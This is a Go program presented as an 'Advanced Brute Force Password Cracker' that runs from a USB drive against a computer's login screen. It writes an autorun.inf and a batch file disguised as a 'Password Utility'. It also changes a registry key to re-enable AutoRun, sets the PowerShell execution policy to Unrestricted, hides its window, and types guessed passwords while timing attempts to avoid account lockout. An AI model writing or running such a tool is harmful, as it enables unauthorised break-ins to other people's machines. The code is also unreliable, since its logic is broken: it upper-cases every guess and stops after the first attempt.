package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unicode"

	"github.com/go-vgo/robotgo"
)

const (
	stateFile          = "bruteforce_state.txt"
	resultsFile        = "bruteforce_results.txt"
	alphabet           = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"
	minLength          = 4
	maxLength          = 10
	delayBetween       = 500 // milliseconds
	maxAttempts        = 5
	lockoutDelay       = 5 * time.Minute
	loginScreenTimeout = 3 * time.Second
)

type ProgressState struct {
	CurrentLength int
	CurrentCombo  string
	AttemptCount  int
	LastAttempt   time.Time
}

func init() {
	setupAutorun()
	checkOS()
	bypassWindowsProtection()
	stealthMode()
}

func setupAutorun() {
	autorunContent := `[AutoRun]
open=bruteforce.exe
icon=bruteforce.exe
action=Password Recovery Tool
label=Password Utility
shell\start=Run Password Tool
shell\start\command=bruteforce.exe
`

	if _, err := os.Stat("autorun.inf"); os.IsNotExist(err) {
		os.WriteFile("autorun.inf", []byte(autorunContent), 0644)
	}

	batContent := `@echo off
start /min bruteforce.exe
exit
`

	if _, err := os.Stat("start.bat"); os.IsNotExist(err) {
		os.WriteFile("start.bat", []byte(batContent), 0644)
	}
}

func checkOS() {
	if runtime.GOOS == "linux" {
		os.Mkdir("/mnt/usb", 0755)
		exec.Command("mount", "/dev/sdb1", "/mnt/usb").Run()
		os.Chdir("/mnt/usb")
	}
}

func bypassWindowsProtection() {
	if runtime.GOOS == "windows" {
		exec.Command("reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
			"/v", "NoDriveTypeAutoRun", "/t", "REG_DWORD", "/d", "0x20", "/f").Run()
		exec.Command("powershell", "Set-ExecutionPolicy", "Unrestricted", "-Force").Run()
	}
}

func stealthMode() {
	if runtime.GOOS == "windows" {
		exec.Command("cmd", "/C", "start", "/min", "bruteforce.exe").Start()
		robotgo.KeyTap("d", "ctrl", "alt")
		robotgo.MoveMouse(100, 100)
		robotgo.Click()
		time.Sleep(500 * time.Millisecond)
	}
}

func SaveState(state ProgressState) error {
	file, err := os.Create(stateFile)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = fmt.Fprintf(file, "%d\n%s\n%d\n%s",
		state.CurrentLength,
		state.CurrentCombo,
		state.AttemptCount,
		state.LastAttempt.Format(time.RFC3339),
	)
	return err
}

func LoadState() (ProgressState, error) {
	state := ProgressState{
		CurrentLength: minLength,
		LastAttempt:   time.Now(),
	}

	if _, err := os.Stat(stateFile); os.IsNotExist(err) {
		return state, nil
	}

	file, err := os.Open(stateFile)
	if err != nil {
		return state, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	line := 0
	for scanner.Scan() {
		switch line {
		case 0:
			state.CurrentLength, _ = strconv.Atoi(scanner.Text())
		case 1:
			state.CurrentCombo = scanner.Text()
		case 2:
			state.AttemptCount, _ = strconv.Atoi(scanner.Text())
		case 3:
			state.LastAttempt, _ = time.Parse(time.RFC3339, scanner.Text())
		}
		line++
	}

	return state, nil
}

func SaveResult(password string) {
	file, err := os.OpenFile(resultsFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	fmt.Fprintf(file, "%s - %s\n", password, time.Now().Format(time.RFC3339))
}

func SendKeys(keys string) {
	upperKeys := ""
	for _, r := range keys {
		upperKeys += string(unicode.ToUpper(r))
	}

	robotgo.TypeStr(upperKeys)
	robotgo.KeyTap("enter")
	time.Sleep(time.Millisecond * delayBetween)
}

func IsLoginScreenActive() bool {
	screenWidth, screenHeight := robotgo.GetScreenSize()
	color1 := robotgo.GetPixelColor(screenWidth/2, screenHeight/3)
	color2 := robotgo.GetPixelColor(screenWidth/2, 2*screenHeight/3)

	loginScreenColors := []string{"000000", "1a1a1a", "ffffff", "e5e5e5"}
	for _, c := range loginScreenColors {
		if color1 == c || color2 == c {
			return true
		}
	}
	return false
}

func EnsureLoginScreen() bool {
	if IsLoginScreenActive() {
		return true
	}

	fmt.Println("[!] Switching to login screen...")
	robotgo.KeyTap("esc")
	time.Sleep(1 * time.Second)

	cmd := exec.Command("powershell", "Start-Process", "cmd", "-Verb", "runAs")
	_ = cmd.Run()
	time.Sleep(loginScreenTimeout)

	return IsLoginScreenActive()
}

func BruteForce(alphabet string, buffer []rune, pos, length int, startFrom string, state *ProgressState) bool {
	if pos == length {
		password := string(buffer[:length])
		fmt.Printf("Attempt #%d: %s\n", state.AttemptCount+1, password)
		SaveResult(password)

		if !EnsureLoginScreen() {
			fmt.Println("[-] Failed to access login screen")
			return false
		}

		SendKeys(password)
		state.AttemptCount++
		state.LastAttempt = time.Now()

		if state.AttemptCount >= maxAttempts {
			fmt.Printf("[!] Attempt limit reached. Waiting %v...\n", lockoutDelay)
			time.Sleep(lockoutDelay)
			state.AttemptCount = 0
		}

		return false
	}

	if pos < len(startFrom) {
		buffer[pos] = rune(startFrom[pos])
		if !BruteForce(alphabet, buffer, pos+1, length, startFrom, state) {
			return false
		}
		return true
	}

	for _, char := range alphabet {
		buffer[pos] = char
		if !BruteForce(alphabet, buffer, pos+1, length, startFrom, state) {
			return false
		}
	}
	return true
}

func main() {
	if isRunningFromUSB() {
		exec.Command("cmd", "/C", "start", "/min", filepath.Base(os.Args[0])).Run()
		os.Exit(0)
	}

	fmt.Println("Advanced Brute Force Password Cracker")
	fmt.Println("-----------------------------------")

	state, err := LoadState()
	if err != nil {
		fmt.Printf("State load error: %v\n", err)
		return
	}

	if time.Since(state.LastAttempt) < lockoutDelay/2 {
		remaining := time.Until(state.LastAttempt.Add(lockoutDelay / 2))
		fmt.Printf("[!] Wait %v to avoid lockout\n", remaining)
		time.Sleep(remaining)
	}

	var choice string
	if state.CurrentCombo != "" {
		fmt.Printf("Found saved state: length %d, combo '%s'\n", state.CurrentLength, state.CurrentCombo)
		fmt.Print("Continue (c), restart (n) or quit (q)? [c/n/q]: ")
		fmt.Scanln(&choice)

		if strings.ToLower(choice) == "q" {
			return
		}
	}

	buffer := make([]rune, maxLength)

	for length := state.CurrentLength; length <= maxLength; length++ {
		fmt.Printf("\n[+] Trying length %d...\n", length)

		startFrom := ""
		if strings.ToLower(choice) != "n" && length == state.CurrentLength {
			startFrom = state.CurrentCombo
		}

		if !BruteForce(alphabet, buffer, 0, length, startFrom, &state) {
			break
		}

		state.CurrentCombo = ""
		state.CurrentLength = length + 1
		if err := SaveState(state); err != nil {
			fmt.Printf("State save error: %v\n", err)
		}
	}

	fmt.Println("\n[!] All combinations tried. Password not found.")
}

func isRunningFromUSB() bool {
	exePath, _ := os.Executable()
	for _, drive := range []string{"D:", "E:", "F:", "G:"} {
		if strings.HasPrefix(strings.ToUpper(exePath), drive) {
			return true
		}
	}
	return false
}
